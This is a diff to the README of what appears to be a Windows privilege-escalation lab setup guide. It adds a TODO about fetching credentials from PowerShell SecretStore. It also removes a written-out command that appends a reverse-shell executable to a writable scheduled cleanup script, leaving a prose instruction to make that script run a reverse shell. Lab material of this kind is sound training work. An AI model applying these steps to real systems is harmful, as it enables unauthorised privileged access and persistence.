@@ -7,6 +7,10 @@ Very special thanks for [sagishahar](https://github.com/sagishahar/) and [blaked
 
 And last, but not least, [Tib3rius](https://github.com/Tib3rius/) and his setup.bat for Windows Privilege Escalation.
 
+TODO:
+
+- [ ] Implement a [SecretStore](https://learn.microsoft.com/en-us/powershell/utility-modules/secretmanagement/how-to/using-secrets-in-automation?view=ps-modules) access in order to get some credentials.
+
 # Download Windows 11 dev edition
 Download from this link: https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/
 
@@ -284,7 +288,4 @@ Get-ScheduledTask | select TaskName,State
 ```
 
 There is a file Clean.ps1 which we can modify it (check all of this).
-Find it and use the following command to add our reverse shell to be executed.
-```
-echo C:\Path\For\Our\reverse.exe >> C:\Paths\to\Find\CleanUp.ps1
-```
+Find it and change it to execute your reverse shell.
